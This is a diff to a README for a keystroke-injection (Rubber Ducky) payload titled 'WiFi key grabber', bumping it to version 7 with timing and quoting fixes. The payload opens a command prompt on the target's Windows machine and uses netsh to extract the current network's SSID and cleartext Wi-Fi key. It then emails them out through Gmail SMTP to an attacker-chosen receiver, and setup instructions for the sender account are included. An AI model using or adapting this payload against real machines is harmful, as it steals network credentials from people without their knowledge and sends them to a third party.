@@ -1,6 +1,7 @@
 ### Change the following things;
 * **ACCOUNT**: Your **gmail account**
 * **PASSWORD**: Your **gmail password**
+* Make sure your Gmail password does not start with a capital letter, in some locales this causes the quote to be merged with the letter; 'Ä' '"A'
 * Make sure you have allowed less secure apps to login on your google account; 
 * https://support.google.com/accounts/answer/6010255
 * **RECEIVER**: The email you want to send the contents of 'log' to
@@ -9,7 +10,7 @@
 ```
 REM Title: WiFi key grabber
 REM Author: SiemH
-REM Version: 6
+REM Version: 7
 REM Description: 
 REM Finds SSID, Network type, Authentication type and the network key and saves them to 'log'
 REM Creates SMTP server and emails the contents of 'log' using the specified Gmail account to the specified receiver.
@@ -18,6 +19,7 @@ REM FASE 1: Preparation
 DELAY 3000
 REM --> Minimize all windows
 WINDOWS d
+DELAY 250
 REM --> Open cmd
 WINDOWS r
 DELAY 500
@@ -27,21 +29,21 @@ DELAY 200
 
 REM FASE 2: Information gathering
 REM --> Find the SSID and set 'a'
-STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=:" %a in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set a=%a
+STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=:"  %a in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set a=%a
 ENTER
 STRING set a="%a:~1%"
 ENTER
 REM --> Get raw info and set 'a'
-STRING netsh wlan show profiles %a% key=clear | findstr /c:"Network type" /c:"Authentication" /c:"Key Content" | findstr /v "broadcast" | findstr /v "Radio">>a
+STRING netsh wlan show profiles %a% key=clear | findstr /c:"Network type"  /c:" Authentication"  /c:"Key Content"| findstr /v "broadcast"| findstr /v "Radio">>a
 ENTER
 REM --> Find the Network type in the raw info and set 'b'
-STRING for /f "tokens=3 delims=: " %a in ('findstr "Network type" a') do set b=%a
+STRING for /f "tokens=3 delims=: "  %a in ('findstr "Network type"  a') do set b=%a
 ENTER
 REM --> Find the auth type in the raw info and set 'c'
-STRING for /f "tokens=2 delims=: " %a in ('findstr "Authentication" a') do set c=%a
+STRING for /f "tokens=2 delims=: "  %a in ('findstr " Authentication"  a') do set c=%a
 ENTER
 REM --> Find the key content in the raw info and set 'd'
-STRING for /f "tokens=3 delims=: " %a in ('findstr "Key Content" a') do set d=%a
+STRING for /f "tokens=3 delims=: "  %a in ('findstr "Key Content"  a') do set d=%a
 ENTER
 REM --> Delete raw info / 'a'
 STRING del a
@@ -60,7 +62,7 @@ STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 ENTER
 STRING $SMTPInfo.EnableSsl = $true
 ENTER
-REM --> Google account login
+REM --> Google account login, password must start with a lowercase letter
 STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('ACCOUNT@gmail.com', 'PASSWORD')
 ENTER
 STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
@@ -94,6 +96,7 @@ ENTER
 4. Removed the space as delimiter
 5. Added the STRING set A="%A:~1%" to be able to use SSID's with spaces as well
 6. Removed .txt extensions, made variables and file names lower case, removed unnecessary text from log and added some more comments
+7. Added some spaces, quote interferance; sometimes 'Ä' instead of '"A'
 
 ### Suggestions;
 **If you have any suggestions, write them down here.**
